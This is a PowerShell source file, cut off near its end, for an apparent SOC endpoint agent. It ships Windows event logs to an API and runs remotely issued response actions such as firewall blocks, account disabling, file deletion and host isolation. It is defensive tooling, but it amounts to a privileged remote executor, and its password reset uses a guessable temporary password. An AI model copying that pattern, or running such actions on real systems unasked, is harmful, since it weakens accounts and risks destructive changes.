# SOCMind Windows Agent v3.1.0 - Universal Executor
# Copyright (c) 2025 SOCMind. All rights reserved.
# Contact: security@socmind.ai
# Capabilities: Log Collector + Action Executor + IOC Enforcer + Playbook Runner

param([Parameter(Position=0)][string]$Command="help")

# Force TLS 1.2 (required by SOCMind API endpoints)
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$script:AgentVersion = "3.1.0"
$script:ConfigPath = Join-Path $PSScriptRoot "agent.conf"
$script:CachePath = Join-Path $PSScriptRoot ".socm_license_cache"
$script:IOCPath = Join-Path $PSScriptRoot ".socm_active_iocs"
$script:ActionLogPath = Join-Path $PSScriptRoot "action_log.json"

# ========== Configuration ==========
function Read-Config {
    if (-not (Test-Path $script:ConfigPath)) { return $null }
    $cfg = @{}
    Get-Content $script:ConfigPath | ForEach-Object {
        if ($_ -match '^\s*([^#=]+?)\s*=\s*(.+?)\s*$') {
            $cfg[$Matches[1].Trim()] = $Matches[2].Trim()
        }
    }
    return $cfg
}

function Write-Config {
    param($ApiKey, $ApiEndpoint, $LicenseKey, $Mode)
    @"
[agent]
api_key = $ApiKey
api_endpoint = $ApiEndpoint
license_key = $LicenseKey
mode = $($Mode -or "executor")
"@ | Set-Content $script:ConfigPath -Encoding UTF8
    Write-Host "[OK] Configuration saved to agent.conf" -ForegroundColor Green
}

# ========== License Validation ==========
function Get-HardwareId {
    $node = $env:COMPUTERNAME
    try { $uuid = (Get-WmiObject Win32_ComputerSystemProduct).UUID } catch { $uuid = "unknown" }
    $host_ = [System.Net.Dns]::GetHostName()
    $raw = "$node-$uuid-$host_"
    $sha = [System.Security.Cryptography.SHA256]::Create()
    $hash = $sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($raw))
    return ([System.BitConverter]::ToString($hash) -replace '-','').Substring(0,32).ToLower()
}

function Test-LicenseFormat {
    param([string]$Key)
    if (-not $Key.StartsWith("SOCM-") -or $Key.Length -ne 24) { return $false }
    $parts = $Key -split '-'
    if ($parts.Count -ne 5) { return $false }
    foreach ($p in $parts[1..4]) {
        if ($p.Length -ne 4 -or $p -notmatch '^[A-Za-z0-9]+$') { return $false }
    }
    return $true
}

function Invoke-LicenseValidation {
    param($ApiEndpoint, $ApiKey, $LicenseKey)
    if (-not (Test-LicenseFormat $LicenseKey)) {
        Write-Host "[ERR:0x4C494E56] Invalid license format" -ForegroundColor Red
        return $false
    }
    $hwid = Get-HardwareId
    $url = "$ApiEndpoint/agent-gateway/validate-license"
    $payload = @{
        license_key = $LicenseKey; hardware_id = $hwid
        agent_version = $script:AgentVersion; platform = "windows"
        timestamp = (Get-Date).ToUniversalTime().ToString("o")
    } | ConvertTo-Json -Compress
    $encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($payload))
    $body = @{ payload = $encoded } | ConvertTo-Json
    try {
        $headers = @{ "Content-Type" = "application/json"; "X-Agent-Key" = $ApiKey; "User-Agent" = "SOCMind-Agent-Windows/$($script:AgentVersion)" }
        $resp = Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $body -TimeoutSec 30
        if ($resp.is_valid -eq $true) {
            Write-Host "[LICENSE:VALID] Type: $($resp.license_type) | Org: $($resp.organization_name) | Days left: $($resp.days_remaining)" -ForegroundColor Green
            return $true
        } else {
            Write-Host "[LICENSE:INVALID] $($resp.error_message)" -ForegroundColor Red
            return $false
        }
    } catch {
        Write-Host "[ERR:0x4E455457] Network error: $_" -ForegroundColor Yellow
        return $false
    }
}

# ========== Log Collection ==========
$script:LastSecurityTime = $null
$script:LastSystemTime = $null
$script:TotalLogsSent = 0
$script:CycleCount = 0

function Get-SecurityLogs {
    param([int]$MaxEvents = 100)
    $logs = @()
    try {
        $filter = @{ LogName = 'Security'; Id = @(4624, 4625, 4648, 4672, 4688, 4689, 4697, 4698, 4720, 4722, 4724, 4728, 4732) }
        if ($script:LastSecurityTime) { $filter['StartTime'] = $script:LastSecurityTime.AddSeconds(1) }
        $securityLogs = @()
        try {
            $securityLogs = @(Get-WinEvent -FilterHashtable $filter -MaxEvents $MaxEvents -ErrorAction Stop)
        } catch {
            if ($_.Exception.Message -notlike "*No events were found*") { throw }
        }
        if ($securityLogs.Count -gt 0) {
            $script:LastSecurityTime = ($securityLogs | Sort-Object TimeCreated -Descending | Select-Object -First 1).TimeCreated
            foreach ($evt in $securityLogs) {
                $msg = "Event $($evt.Id)"
                try { if ($evt.Message) { $msg = $evt.Message.Substring(0, [Math]::Min(500, $evt.Message.Length)) } } catch {}
                $logs += @{
                    log_type = "security"; timestamp = $evt.TimeCreated.ToUniversalTime().ToString("o")
                    message = $msg
                    severity = if ($evt.Id -in @(4625, 4648)) { 4 } elseif ($evt.Id -in @(4672, 4697)) { 3 } else { 2 }
                    event_id = $evt.Id.ToString(); source_ip = $env:COMPUTERNAME
                    raw_log = @{ Id = $evt.Id; Provider = $evt.ProviderName }
                }
            }
        }
    } catch {
        if ($_.Exception.Message -notlike "*No events were found*") {
            Write-Host "[WARN] Security log: $_" -ForegroundColor Yellow
        }
    }
    try {
        $sysFilter = @{ LogName = 'System'; Level = @(1, 2, 3) }
        if ($script:LastSystemTime) { $sysFilter['StartTime'] = $script:LastSystemTime.AddSeconds(1) }
        $systemLogs = @()
        try {
            $systemLogs = @(Get-WinEvent -FilterHashtable $sysFilter -MaxEvents 50 -ErrorAction Stop)
        } catch {
            if ($_.Exception.Message -notlike "*No events were found*") { throw }
        }
        if ($systemLogs.Count -gt 0) {
            $script:LastSystemTime = ($systemLogs | Sort-Object TimeCreated -Descending | Select-Object -First 1).TimeCreated
            foreach ($evt in $systemLogs) {
                $msg = "Event $($evt.Id)"
                try { if ($evt.Message) { $msg = $evt.Message.Substring(0, [Math]::Min(500, $evt.Message.Length)) } } catch {}
                $logs += @{
                    log_type = "system"; timestamp = $evt.TimeCreated.ToUniversalTime().ToString("o")
                    message = $msg
                    severity = if ($evt.Level -eq 1) { 5 } elseif ($evt.Level -eq 2) { 4 } else { 3 }
                    event_id = $evt.Id.ToString(); source_ip = $env:COMPUTERNAME
                    raw_log = @{ Id = $evt.Id; Provider = $evt.ProviderName; Level = $evt.Level }
                }
            }
        }
    } catch {
        if ($_.Exception.Message -notlike "*No events were found*") {
            Write-Host "[WARN] System log: $_" -ForegroundColor Yellow
        }
    }
    return $logs
}

function Send-Logs {
    param($ApiEndpoint, $ApiKey, $Logs)
    if ($Logs.Count -eq 0) {
        Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Waiting for new events... (total sent: $($script:TotalLogsSent))" -ForegroundColor Gray
        return $true
    }
    $url = "$ApiEndpoint/agent-gateway/ingest"
    $body = @{ logs = $Logs } | ConvertTo-Json -Depth 10 -Compress
    try {
        $headers = @{ "Content-Type" = "application/json"; "X-Agent-Key" = $ApiKey; "User-Agent" = "SOCMind-Agent-Windows/$($script:AgentVersion)" }
        $resp = Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $body -TimeoutSec 60
        $script:TotalLogsSent += $Logs.Count
        Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Sent $($Logs.Count) logs -> $($resp.processed) processed, $($resp.incidents_created) incidents (total: $($script:TotalLogsSent))" -ForegroundColor Green
        return $true
    } catch {
        Write-Host "[ERR] Failed to send logs: $_" -ForegroundColor Red
        return $false
    }
}

# ========== Safe Parameter Access ==========
function Get-ActionParam {
    param($Action, [string]$ParamName, $Default = $null)
    try {
        if ($null -eq $Action) { return $Default }
        if (-not $Action.PSObject.Properties['parameters']) { return $Default }
        $params = $Action.parameters
        if ($null -eq $params) { return $Default }
        if ($params -is [hashtable]) {
            if ($params.ContainsKey($ParamName)) { return $params[$ParamName] }
            return $Default
        }
        if ($params.PSObject.Properties[$ParamName]) { return $params.$ParamName }
        return $Default
    } catch { return $Default }
}

# ========== Resolve API IPs ==========
function Get-ApiIPs {
    param([string]$ApiEndpoint)
    $ips = @()
    try {
        $uri = [System.Uri]$ApiEndpoint
        $ips = @([System.Net.Dns]::GetHostAddresses($uri.Host) | ForEach-Object { $_.IPAddressToString })
    } catch {}
    return $ips
}

# ========== Self-Protection ==========
function Test-IsSafeToBlock {
    param([string]$TargetIP, [string]$ApiEndpoint)
    # Never block localhost
    if ($TargetIP -in @("127.0.0.1", "::1", "0.0.0.0", "localhost")) { return $false }
    # Never block local network ranges used by the machine
    try {
        $localIPs = @(Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | ForEach-Object { $_.IPAddress })
        if ($TargetIP -in $localIPs) { return $false }
    } catch {}
    # Never block the default gateway
    try {
        $gw = (Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue | Select-Object -First 1).NextHop
        if ($TargetIP -eq $gw) { return $false }
    } catch {}
    # Never block the SOCMind API endpoint
    $apiIPs = Get-ApiIPs -ApiEndpoint $ApiEndpoint
    if ($TargetIP -in $apiIPs) { return $false }
    return $true
}

# ========== ACTION EXECUTION ENGINE ==========
function Write-ActionLog {
    param($ActionId, $ActionType, $Target, $Status, $Details)
    $entry = @{
        timestamp = (Get-Date).ToUniversalTime().ToString("o")
        action_id = $ActionId; action_type = $ActionType
        target = $Target; status = $Status; details = $Details
        hostname = $env:COMPUTERNAME
    }
    $existing = @()
    if (Test-Path $script:ActionLogPath) {
        try { $existing = @(Get-Content $script:ActionLogPath -Raw | ConvertFrom-Json) } catch { $existing = @() }
    }
    $existing += $entry
    # Keep only last 500 entries
    if ($existing.Count -gt 500) { $existing = $existing[-500..-1] }
    $existing | ConvertTo-Json -Depth 5 | Set-Content $script:ActionLogPath -Encoding UTF8
}

function Invoke-SOARAction {
    param($Action, [switch]$DryRun, [string]$ApiEndpoint)

    $actionType = $null; $target = $null; $mode = $null; $duration = $null; $actionId = $null
    try { $actionType = $Action.action_type } catch {}
    try { $target = $Action.target } catch {}
    try { $mode = $Action.execution_mode } catch {}
    try { $duration = $Action.duration_seconds } catch {}
    try { $actionId = $Action.action_id } catch {}

    if (-not $actionType) {
        return @{ success = $false; details = "Missing action_type" }
    }

    $isDry = $DryRun.IsPresent -or ($mode -eq "dry_run") -or ($mode -eq "simulation")

    Write-Host ""
    Write-Host "========================================" -ForegroundColor Magenta
    Write-Host "  SOAR ACTION: $actionType" -ForegroundColor Magenta
    Write-Host "  Target: $target" -ForegroundColor Magenta
    Write-Host "  Mode: $(if ($isDry) { 'SIMULATION' } else { 'REAL' })" -ForegroundColor $(if ($isDry) { "Yellow" } else { "Red" })
    Write-Host "========================================" -ForegroundColor Magenta

    $result = @{ success = $false; details = "" }

    try {
        switch ($actionType) {
            "block_ip" {
                if ($isDry) {
                    $result = @{ success = $true; details = "DRY-RUN: Would create firewall rule to block $target" }
                } else {
                    # SELF-PROTECTION: Check if safe to block
                    if (-not (Test-IsSafeToBlock -TargetIP $target -ApiEndpoint $ApiEndpoint)) {
                        Write-Host "[BLOCKED] Refusing to block protected IP: $target" -ForegroundColor Yellow
                        $result = @{ success = $false; details = "SELF-PROTECTION: IP $target is protected (localhost, gateway, or management endpoint). Blocking it would disconnect the agent." }
                    } else {
                        $ruleName = "SOCMind-Block-$target-$(Get-Date -Format 'yyyyMMddHHmmss')"
                        New-NetFirewallRule -DisplayName $ruleName -Direction Inbound -RemoteAddress $target -Action Block -ErrorAction Stop | Out-Null
                        New-NetFirewallRule -DisplayName "$ruleName-Out" -Direction Outbound -RemoteAddress $target -Action Block -ErrorAction Stop | Out-Null
                        Write-Host "[OK] Blocked IP: $target (Rule: $ruleName)" -ForegroundColor Green
                        $result = @{ success = $true; details = "Firewall rules created: $ruleName"; rollback_available = $true; rollback_cmd = "Remove-NetFirewallRule -DisplayName '$ruleName'; Remove-NetFirewallRule -DisplayName '$ruleName-Out'" }
                    }
                }
            }
            "unblock_ip" {
                if ($isDry) {
                    $result = @{ success = $true; details = "DRY-RUN: Would remove firewall block for $target" }
                } else {
                    Get-NetFirewallRule -DisplayName "SOCMind-Block-$target*" -ErrorAction SilentlyContinue | Remove-NetFirewallRule
                    $result = @{ success = $true; details = "Removed firewall block for $target" }
                }
            }
            "kill_process" {
                if ($isDry) {
                    $result = @{ success = $true; details = "DRY-RUN: Would kill process: $target" }
                } else {
                    $procs = Get-Process -Name $target -ErrorAction SilentlyContinue
                    if ($procs) {
                        $procs | Stop-Process -Force
                        $result = @{ success = $true; details = "Killed $($procs.Count) processes named $target" }
                    } else {
                        $result = @{ success = $true; details = "No process found with name: $target" }
                    }
                }
            }
            "disable_user" {
                if ($isDry) {
                    $result = @{ success = $true; details = "DRY-RUN: Would disable user: $target" }
                } else {
                    net user $target /active:no 2>&1 | Out-Null
                    $result = @{ success = $true; details = "User $target disabled"; rollback_available = $true }
                    if ($duration -and $duration -gt 0) {
                        Write-Host "[INFO] User will be re-enabled after $duration seconds" -ForegroundColor Cyan
                        Start-Job -ScriptBlock {
                            param($u, $d); Start-Sleep -Seconds $d; net user $u /active:yes
                        } -ArgumentList $target, $duration | Out-Null
                    }
                }
            }
            "enable_user" {
                if ($isDry) {
                    $result = @{ success = $true; details = "DRY-RUN: Would enable user: $target" }
                } else {
                    net user $target /active:yes 2>&1 | Out-Null
                    $result = @{ success = $true; details = "User $target re-enabled" }
                }
            }
            "lock_account" {
                if ($isDry) {
                    $result = @{ success = $true; details = "DRY-RUN: Would lock account: $target" }
                } else {
                    net user $target /active:no 2>&1 | Out-Null
                    $result = @{ success = $true; details = "Account $target locked"; rollback_available = $true }
                    if ($duration -and $duration -gt 0) {
                        Start-Job -ScriptBlock {
                            param($u, $d); Start-Sleep -Seconds $d; net user $u /active:yes
                        } -ArgumentList $target, $duration | Out-Null
                    }
                }
            }
            "reset_password" {
                if ($isDry) {
                    $result = @{ success = $true; details = "DRY-RUN: Would force password reset for: $target" }
                } else {
                    $tempPw = "SOCMind_Reset_$(Get-Random -Minimum 10000 -Maximum 99999)!"
                    net user $target $tempPw /logonpasswordchg:yes 2>&1 | Out-Null
                    $result = @{ success = $true; details = "Password reset forced for $target. User must change at next logon." }
                }
            }
            "stop_service" {
                if ($isDry) {
                    $result = @{ success = $true; details = "DRY-RUN: Would stop service: $target" }
                } else {
                    Stop-Service -Name $target -Force -ErrorAction Stop
                    $result = @{ success = $true; details = "Service $target stopped"; rollback_available = $true }
                }
            }
            "start_service" {
                if ($isDry) {
                    $result = @{ success = $true; details = "DRY-RUN: Would start service: $target" }
                } else {
                    Start-Service -Name $target -ErrorAction Stop
                    $result = @{ success = $true; details = "Service $target started" }
                }
            }
            "quarantine_file" {
                if ($isDry) {
                    $result = @{ success = $true; details = "DRY-RUN: Would quarantine file: $target" }
                } else {
                    $quarantineDir = "C:\SOCMind\Quarantine"
                    if (-not (Test-Path $quarantineDir)) { New-Item -ItemType Directory -Path $quarantineDir -Force | Out-Null }
                    if (Test-Path $target) {
                        $fileName = [System.IO.Path]::GetFileName($target)
                        $qPath = Join-Path $quarantineDir "$fileName.quarantined"
                        Move-Item -Path $target -Destination $qPath -Force
                        $result = @{ success = $true; details = "File quarantined: $target -> $qPath"; rollback_available = $true }
                    } else {
                        $result = @{ success = $false; details = "File not found: $target" }
                    }
                }
            }
            "delete_file" {
                if ($isDry) {
                    $result = @{ success = $true; details = "DRY-RUN: Would delete file: $target" }
                } else {
                    if (Test-Path $target) {
                        Remove-Item -Path $target -Force
                        $result = @{ success = $true; details = "File deleted: $target" }
                    } else {
                        $result = @{ success = $false; details = "File not found: $target" }
                    }
                }
            }
            "isolate_host" {
                if ($isDry) {
                    $result = @{ success = $true; details = "DRY-RUN: Would isolate host (block all non-SOCMind traffic)" }
                } else {
                    # STEP 0: Remove any previous isolation rules first
                    Get-NetFirewallRule -DisplayName "SOCMind-Isolate-*" -ErrorAction SilentlyContinue | Remove-NetFirewallRule -ErrorAction SilentlyContinue

                    # Resolve API IPs for whitelist
                    $apiIPs = Get-ApiIPs -ApiEndpoint $ApiEndpoint
                    if ($apiIPs.Count -eq 0) {
                        Write-Host "[WARN] Could not resolve API IPs - aborting isolation to prevent lockout" -ForegroundColor Yellow
                        $result = @{ success = $false; details = "SAFETY: Cannot resolve API endpoint IPs. Aborting isolation to prevent agent lockout." }
                    } else {
                        # Get default gateway
                        $defaultGW = $null
                        try { $defaultGW = (Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue | Select-Object -First 1).NextHop } catch {}

                        # Get custom gateway from params
                        $gwHost = Get-ActionParam -Action $Action -ParamName "gateway_host"

                        # CRITICAL: Create ALLOW rules FIRST before blocking
                        # Windows Firewall: Allow rules with higher priority must exist before Block-All

                        # 1. Allow loopback
                        New-NetFirewallRule -DisplayName "SOCMind-Isolate-AllowLoopback" -Direction Outbound -RemoteAddress 127.0.0.1 -Action Allow -Profile Any -ErrorAction SilentlyContinue | Out-Null

                        # 2. Allow DNS (needed to resolve API endpoint)
                        New-NetFirewallRule -DisplayName "SOCMind-Isolate-AllowDNS-UDP" -Direction Outbound -RemotePort 53 -Protocol UDP -Action Allow -Profile Any -ErrorAction SilentlyContinue | Out-Null
                        New-NetFirewallRule -DisplayName "SOCMind-Isolate-AllowDNS-TCP" -Direction Outbound -RemotePort 53 -Protocol TCP -Action Allow -Profile Any -ErrorAction SilentlyContinue | Out-Null

                        # 3. Allow default gateway (needed for routing)
                        if ($defaultGW) {
                            New-NetFirewallRule -DisplayName "SOCMind-Isolate-AllowGW" -Direction Outbound -RemoteAddress $defaultGW -Action Allow -Profile Any -ErrorAction SilentlyContinue | Out-Null
                        }

                        # 4. Allow custom gateway
                        if ($gwHost) {
                            New-NetFirewallRule -DisplayName "SOCMind-Isolate-AllowCustomGW" -Direction Outbound -RemoteAddress $gwHost -Action Allow -Profile Any -ErrorAction SilentlyContinue | Out-Null
                        }

                        # 5. Allow SOCMind API (CRITICAL - management channel)
                        foreach ($ip in $apiIPs) {
                            New-NetFirewallRule -DisplayName "SOCMind-Isolate-AllowAPI-$ip" -Direction Outbound -RemoteAddress $ip -RemotePort 443 -Protocol TCP -Action Allow -Profile Any -ErrorAction SilentlyContinue | Out-Null
                        }

                        # 6. Verify management channel is reachable BEFORE blocking
                        $canReach = $false
                        try {
                            $testUrl = "$ApiEndpoint/agent-gateway/heartbeat"
                            Invoke-RestMethod -Uri $testUrl -Method Post -Headers @{ "X-Agent-Key" = "test"; "Content-Type" = "application/json" } -Body "{}" -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null
                            $canReach = $true
                        } catch {
                            # Even a 401/403 means connectivity works
                            if ($_.Exception.Response) { $canReach = $true }
                        }

                        if (-not $canReach) {
                            Write-Host "[WARN] Cannot verify management channel - aborting isolation" -ForegroundColor Yellow
                            Get-NetFirewallRule -DisplayName "SOCMind-Isolate-*" -ErrorAction SilentlyContinue | Remove-NetFirewallRule -ErrorAction SilentlyContinue
                            $result = @{ success = $false; details = "SAFETY: Management channel unreachable before isolation. Aborted to prevent lockout." }
                        } else {
                            # 7. NOW block all other outbound (Block rules have lower priority than existing Allow rules)
                            # Use -Group to ensure Block-All has lower precedence
                            New-NetFirewallRule -DisplayName "SOCMind-Isolate-BlockAll-Out" -Direction Outbound -Action Block -Profile Any -ErrorAction SilentlyContinue | Out-Null
                            New-NetFirewallRule -DisplayName "SOCMind-Isolate-BlockAll-In" -Direction Inbound -Action Block -Profile Any -ErrorAction SilentlyContinue | Out-Null

                            # 8. Verify connectivity AFTER isolation
                            Start-Sleep -Seconds 2
                            $postCheck = $false
                            try {
                                Invoke-RestMethod -Uri "$ApiEndpoint/agent-gateway/heartbeat" -Method Post -Headers @{ "X-Agent-Key" = "test"; "Content-Type" = "application/json" } -Body "{}" -TimeoutSec 10 -ErrorAction SilentlyContinue | Out-Null
                                $postCheck = $true
                            } catch {
                                if ($_.Exception.Response) { $postCheck = $true }
                            }

                            if (-not $postCheck) {
                                Write-Host "[EMERGENCY] Lost connectivity after isolation - rolling back!" -ForegroundColor Red
                                Get-NetFirewallRule -DisplayName "SOCMind-Isolate-*" -ErrorAction SilentlyContinue | Remove-NetFirewallRule -ErrorAction SilentlyContinue
                                $result = @{ success = $false; details = "EMERGENCY ROLLBACK: Lost management connectivity after isolation. All rules removed." }
                            } else {
                                Write-Host "[OK] Host isolated - management channel verified" -ForegroundColor Green
                                $result = @{ success = $true; details = "Host isolated. Management channel verified. Whitelisted $($apiIPs.Count) API IPs + DNS + GW."; rollback_available = $true }
                            }
                        }
                    }
                }
            }
            "unisolate_host" {
                if ($isDry) {
                    $result = @{ success = $true; details = "DRY-RUN: Would remove host isolation" }
                } else {
                    Get-NetFirewallRule -DisplayName "SOCMind-Isolate-*" -ErrorAction SilentlyContinue | Remove-NetFirewallRule
                    $result = @{ success = $true; details = "Host isolation removed" }
                }
            }
            "show_warning" {
                $msg = Get-ActionParam -Action $Action -ParamName "message" -Default "SOCMind Security Alert: Suspicious activity detected on this workstation."
                if (-not $isDry) {
                    msg * "$msg" 2>&1 | Out-Null
                }
                $result = @{ success = $true; details = "Warning banner displayed to user" }
            }
            default {
                $result = @{ success = $false; details = "Unknown action type: $actionType" }
            }
        }
    } catch {
        $result = @{ success = $false; details = "Action failed: $_" }
        Write-Host "[ERR] Action failed: $_" -ForegroundColor Red
    }

    Write-ActionLog -ActionId $actionId -ActionType $actionType -Target $target -Status $(if ($result.success) {"completed"} else {"failed"}) -Details $result.details
    return $result
}

function Send-ActionResult {
    param($ApiEndpoint, $ApiKey, $ActionDbId, $Result)
    $maxRetries = 3
    $retryDelay = 5
    for ($attempt = 1; $attempt -le $maxRetries; $attempt++) {
        try {
            $url = "$ApiEndpoint/agent-gateway/report-action"
            $body = @{
                action_id = $ActionDbId
                status = if ($Result.success) { "success" } else { "failed" }
                result = $Result
                error_message = if (-not $Result.success) { $Result.details } else { $null }
                rollback_available = [bool]$Result.rollback_available
            } | ConvertTo-Json -Depth 5
            $headers = @{ "Content-Type" = "application/json"; "X-Agent-Key" = $ApiKey }
            Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $body -TimeoutSec 30 | Out-Null
            Write-Host "[OK] Action result reported (attempt $attempt)" -ForegroundColor Green
            return
        } catch {
            if ($attempt -lt $maxRetries) {
                Write-Host "[WARN] Report failed (attempt $attempt/$maxRetries), retrying in ${retryDelay}s..." -ForegroundColor Yellow
                Start-Sleep -Seconds $retryDelay
                $retryDelay *= 2
            } else {
                Write-Host "[ERR] Could not report action result after $maxRetries attempts: $_" -ForegroundColor Red
                # Save to local log for later sync
                Write-ActionLog -ActionId $ActionDbId -ActionType "report_failed" -Target "" -Status "pending_sync" -Details "Result: $($Result.details)"
            }
        }
    }
}

function Poll-Actions {
    param($ApiEndpoint, $ApiKey)
    try {
        $url = "$ApiEndpoint/agent-gateway/poll-actions"
        $headers = @{ "Content-Type" = "application/json"; "X-Agent-Key" = $ApiKey }
        $resp = Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body "{}" -TimeoutSec 15
        if ($resp.actions) { return @($resp.actions) }
        return @()
    } catch {
        return @()
    }
}

# ========== IOC Enforcement ==========
function Enforce-IOCs {
    param($ApiEndpoint, $ApiKey)
    # IOC enforcement is handled via SOAR actions (block_ip, etc.)
}

# ========== Commands ==========
function Invoke-Configure {
    Write-Host ""
    Write-Host "============================================" -ForegroundColor Cyan
    Write-Host "  SOCMind Windows Agent v$($script:AgentVersion) - Configuration" -ForegroundColor Cyan
    Write-Host "  Mode: Universal Executor" -ForegroundColor Cyan
    Write-Host "============================================" -ForegroundColor Cyan
    Write-Host ""
    $existing = Read-Config
    $apiEndpoint = Read-Host "API Endpoint"
    if ([string]::IsNullOrWhiteSpace($apiEndpoint) -and $existing) { $apiEndpoint = $existing["api_endpoint"] }
    $apiKey = Read-Host "API Key (socm_...)"
    if ([string]::IsNullOrWhiteSpace($apiKey) -and $existing) { $apiKey = $existing["api_key"] }
    $licenseKey = Read-Host "License Key (SOCM-XXXX-XXXX-XXXX-XXXX)"
    if ([string]::IsNullOrWhiteSpace($licenseKey) -and $existing) { $licenseKey = $existing["license_key"] }
    if ([string]::IsNullOrWhiteSpace($apiEndpoint) -or [string]::IsNullOrWhiteSpace($apiKey) -or [string]::IsNullOrWhiteSpace($licenseKey)) {
        Write-Host "[FATAL] All fields are required!" -ForegroundColor Red; return
    }
    Write-Config -ApiKey $apiKey -ApiEndpoint $apiEndpoint -LicenseKey $licenseKey -Mode "executor"
    Write-Host "[INFO] Validating license..." -ForegroundColor Cyan
    $valid = Invoke-LicenseValidation -ApiEndpoint $apiEndpoint -ApiKey $apiKey -LicenseKey $licenseKey
    if ($valid) { Write-Host "[OK] Ready! Run './socmind-agent-windows.ps1 run' to start." -ForegroundColor Green }
}

function Invoke-Run {
    param([switch]$DryRun)
    $cfg = Read-Config
    if (-not $cfg -or -not $cfg["api_key"] -or -not $cfg["api_endpoint"]) {
        Write-Host "[FATAL] Not configured. Run './socmind-agent-windows.ps1 configure' first." -ForegroundColor Red; return
    }
    $apiKey = $cfg["api_key"]; $apiEndpoint = $cfg["api_endpoint"]; $licenseKey = $cfg["license_key"]
    if ([string]::IsNullOrWhiteSpace($licenseKey)) {
        $licenseKey = Read-Host "Enter license key (SOCM-XXXX-XXXX-XXXX-XXXX)"
        if ([string]::IsNullOrWhiteSpace($licenseKey)) { Write-Host "[FATAL] License key required!" -ForegroundColor Red; return }
    }

    Write-Host ""
    Write-Host "============================================" -ForegroundColor Cyan
    Write-Host "  SOCMind Windows Agent v$($script:AgentVersion)" -ForegroundColor Cyan
    Write-Host "  Capabilities: Collector + Executor + IOC" -ForegroundColor Cyan
    Write-Host "  Mode: $(if ($DryRun) { 'DRY-RUN (Simulation)' } else { 'LIVE' })" -ForegroundColor $(if ($DryRun) { "Yellow" } else { "Green" })
    Write-Host "============================================" -ForegroundColor Cyan
    Write-Host ""

    Write-Host "[INFO] Validating license..." -ForegroundColor Cyan
    if (-not (Invoke-LicenseValidation -ApiEndpoint $apiEndpoint -ApiKey $apiKey -LicenseKey $licenseKey)) {
        Write-Host "[FATAL] License validation failed." -ForegroundColor Red; return
    }

    Write-Host "[INFO] Starting agent (Ctrl+C to stop)..." -ForegroundColor Cyan

    # Timing: collect logs every 30s, poll actions every 10s, heartbeat every 60s
    $logInterval = 30
    $actionPollInterval = 10
    $heartbeatInterval = 60
    $licenseCheckInterval = 3600

    $lastLogCollection = [DateTime]::MinValue
    $lastActionPoll = [DateTime]::MinValue
    $lastHeartbeat = [DateTime]::MinValue
    $lastValidation = Get-Date

    # Tick every 5 seconds for responsive action polling
    $tickInterval = 5

    while ($true) {
        try {
            $now = Get-Date
            $script:CycleCount++

            # Re-validate license hourly
            if (($now - $lastValidation).TotalSeconds -ge $licenseCheckInterval) {
                if (-not (Invoke-LicenseValidation -ApiEndpoint $apiEndpoint -ApiKey $apiKey -LicenseKey $licenseKey)) {
                    Write-Host "[FATAL] License expired." -ForegroundColor Red; break
                }
                $lastValidation = $now
            }

            # Collect and send logs every 30s
            if (($now - $lastLogCollection).TotalSeconds -ge $logInterval) {
                $logs = Get-SecurityLogs -MaxEvents 100
                Send-Logs -ApiEndpoint $apiEndpoint -ApiKey $apiKey -Logs $logs | Out-Null
                $lastLogCollection = $now
            }

            # Poll for SOAR actions every 10s
            if (($now - $lastActionPoll).TotalSeconds -ge $actionPollInterval) {
                $actions = Poll-Actions -ApiEndpoint $apiEndpoint -ApiKey $apiKey
                if ($actions.Count -gt 0) {
                    Write-Host "[ACTION] Received $($actions.Count) action(s)" -ForegroundColor Magenta
                    foreach ($act in $actions) {
                        $result = Invoke-SOARAction -Action $act -DryRun:$DryRun -ApiEndpoint $apiEndpoint
                        try {
                            $actId = $act.id
                            if ($actId) { Send-ActionResult -ApiEndpoint $apiEndpoint -ApiKey $apiKey -ActionDbId $actId -Result $result }
                        } catch {}
                    }
                }
                $lastActionPoll = $now
            }

            # Heartbeat every 60s
            if (($now - $lastHeartbeat).TotalSeconds -ge $heartbeatInterval) {
                try {
                    $heartbeatUrl = "$apiEndpoint/agent-gateway/heartbeat"
                    $localIP = $null
                    try { $localIP = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" } | Select-Object -First 1).IPAddress } catch {}
                    $heartbeatBody = @{
                        hostname = $env:COMPUTERNAME; status = "active"; logs_sent = $script:TotalLogsSent
                        ip_address = $localIP
                        agent_version = $script:AgentVersion; capabilities = @("collector", "executor", "ioc_enforcer")
                    } | ConvertTo-Json
                    Invoke-RestMethod -Uri $heartbeatUrl -Method Post -Headers @{ "X-Agent-Key" = $apiKey; "Content-Type" = "application/json" } -Body $heartbeatBody -TimeoutSec 10 | Out-Null
                } catch {}
                $lastHeartbeat = $now
            }

            Start-Sleep -Seconds $tickInterval
        } catch {
            Write-Host "[ERR] Loop error: $_" -ForegroundColor Red
            Start-Sleep -Seconds 5
        }
    }
}

function Show-Status {
    $cfg = Read-Config
    Write-Host ""
    Write-Host "SOCMind Agent v$($script:AgentVersion) Status" -ForegroundColor Cyan
    Write-Host "================================" -ForegroundColor Cyan
    if (-not $cfg) {
        Write-Host "Status: NOT CONFIGURED" -ForegroundColor Red
    } else {
        Write-Host "API Endpoint: $($cfg["api_endpoint"])" -ForegroundColor Gray
        Write-Host "API Key: $($cfg["api_key"].Substring(0,12))..." -ForegroundColor Gray
        $lic = $cfg["license_key"]
        if ($lic) { Write-Host "License: $($lic.Substring(0,9))..." -ForegroundColor Gray }
        Write-Host "Hardware ID: $(Get-HardwareId)" -ForegroundColor Gray
        Write-Host "Capabilities: Collector, Executor, IOC Enforcer" -ForegroundColor Green
    }
    if (Test-Path $script:ActionLogPath) {
        try {
            $actionLog = Get-Content $script:ActionLogPath -Raw | ConvertFrom-Json
